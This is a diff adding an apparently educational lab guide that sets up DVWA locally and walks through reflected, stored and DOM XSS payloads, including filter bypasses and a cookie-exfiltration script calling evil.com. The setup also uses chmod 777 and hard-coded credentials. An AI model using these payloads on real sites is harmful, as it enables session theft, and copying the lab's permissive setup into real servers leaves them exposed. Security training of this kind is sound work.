@@ -1,0 +1,254 @@
+# 🚩 **Practical: DVWA – XSS Testing Lab**
+
+## 📌 **What is DVWA?**
+
+> DVWA is a deliberately vulnerable PHP/MySQL web app for practicing web security attacks like **SQL Injection**, **XSS**, **Command Injection**, **File Inclusion**, etc., in a **legal, safe, isolated environment**.
+
+---
+
+## 🔹 **STEP 1 — Install Dependencies**
+
+Run as **root**:
+
+```bash
+sudo -s
+apt update
+apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php git
+```
+
+---
+
+## 🔹 **STEP 2 — Download DVWA**
+
+Move to Apache’s web root:
+
+```bash
+cd /var/www/html/
+git clone https://github.com/digininja/DVWA.git
+```
+
+---
+
+## 🔹 **STEP 3 — Configure DVWA**
+
+Go inside the DVWA folder:
+
+```bash
+cd /var/www/html/DVWA
+cp config/config.inc.php.dist config/config.inc.php
+nano config/config.inc.php
+```
+
+Edit the **database settings**:
+
+```php
+$_DVWA[ 'db_server' ] = '127.0.0.1';
+$_DVWA[ 'db_port' ] = '3306';
+$_DVWA[ 'db_user' ] = 'admin';
+$_DVWA[ 'db_password' ] = 'admin@123';
+$_DVWA[ 'db_database' ] = 'dvwa';
+```
+
+✔️ **Save & exit:** `Ctrl+O`, `Enter`, `Ctrl+X`.
+
+---
+
+## 🔹 **STEP 4 — Configure Database**
+
+Restart MariaDB:
+
+```bash
+systemctl restart mariadb.service
+```
+
+Enter MariaDB shell:
+
+```bash
+mariadb -u root
+```
+
+Inside **MariaDB prompt**:
+
+```sql
+CREATE DATABASE dvwa;
+CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin@123';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'admin'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
+```
+
+---
+
+## 🔹 **STEP 5 — Fix Permissions**
+
+```bash
+chmod -R 777 /var/www/html/DVWA
+systemctl restart mariadb.service
+systemctl restart apache2.service
+```
+
+---
+
+## 🔹 **STEP 6 — Setup DVWA in Browser**
+
+1. Open:
+
+   ```
+   http://localhost/DVWA/index.php
+   ```
+
+2. **Login:**
+
+   - Username: `admin`
+   - Password: `password`
+
+3. Scroll to the bottom → Click **Create / Reset Database**.
+
+4. Re-login → DVWA Dashboard is now active!
+
+---
+
+## ✅ **DVWA IS READY!**
+
+---
+
+## 🔹 **STEP 7 — XSS PRACTICAL TASKS**
+
+---
+
+## 🔸 1️⃣ **Reflected XSS**
+
+> **Reflected XSS**: User input is reflected back immediately in the response.
+> ✅ Not stored server-side.
+
+**Path:**
+
+```
+DVWA → Vulnerabilities → XSS (Reflected)
+```
+
+- **Low Security:**
+
+  - Enter: `Hello` → Output: `Hello`
+  - Try: `<script>alert("hello")</script>` → Pops up alert.
+  - Try: `<script>alert(document.cookie)</script>` → Pops cookie.
+
+- **Medium Security:**
+
+  - Basic `<script>` is blocked. Try bypass:
+
+    ```html
+    <scr<script>ipt>alert(1)</script>
+    ```
+
+  - Or:
+
+    ```html
+    <scr<script>ipt>alert(document.cookie)</script>
+    ```
+
+- **High Security:**
+
+  - `<script>` blocked → try:
+
+    ```html
+    <img src=x onmouseover=alert("hello")>
+    ```
+
+  - Hover over broken image → alert fires.
+
+---
+
+## 🔸 2️⃣ **Stored XSS**
+
+> **Stored XSS:** Payload is **saved** to the DB, **triggers every time** page loads.
+
+**Path:**
+
+```
+DVWA → Vulnerabilities → XSS (Stored)
+```
+
+- Type: `<script>alert(1)</script>` → Submit.
+- Every time page loads, script runs.
+
+✅ Tip: Some fields have **maxlength** — inspect with DevTools → increase to `100` → inject larger payload.
+
+---
+
+## 🔸 3️⃣ **DOM-Based XSS**
+
+> **DOM XSS:** Exploits client-side JavaScript. Payload in **URL**, parsed in browser.
+
+**Path:**
+
+```
+DVWA → Vulnerabilities → XSS (DOM)
+```
+
+- Select language → Look at URL:
+
+  ```
+  http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English
+  ```
+
+- Replace `English` with:
+
+  ```html
+  <script>
+    alert(1);
+  </script>
+  ```
+
+- Press `Enter` → The page’s JavaScript runs it → alert pops.
+
+---
+
+## ✅ **DVWA Security Level**
+
+- To switch security level:
+
+  - `DVWA Security` → set to **Low**, **Medium**, **High**.
+  - Retest XSS payloads.
+
+---
+
+## 🔹 **EXTRA PRACTICALS**
+
+✔️ Try **XSS filter evasion**:
+
+```html
+<svg/onload=alert(1)>
+```
+
+✔️ Test **encoded payloads**:
+
+```html
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+✔️ Observe **Referrer & Cookies**:
+
+```html
+<script>
+  fetch("http://evil.com/" + document.cookie);
+</script>
+```
+
+_(Lab only!)_
+
+---
+
+## ✅ **DVWA XSS: Final Quick Checklist**
+
+```
+1️⃣ Install Apache, MariaDB, PHP
+2️⃣ Clone DVWA → configure DB
+3️⃣ Create DB, user, permissions
+4️⃣ Fix permissions → Restart services
+5️⃣ Open DVWA in browser → Login → Create DB
+6️⃣ Practice Reflected, Stored, DOM XSS
+7️⃣ Switch security levels → Try filter bypass
+```
+
+---
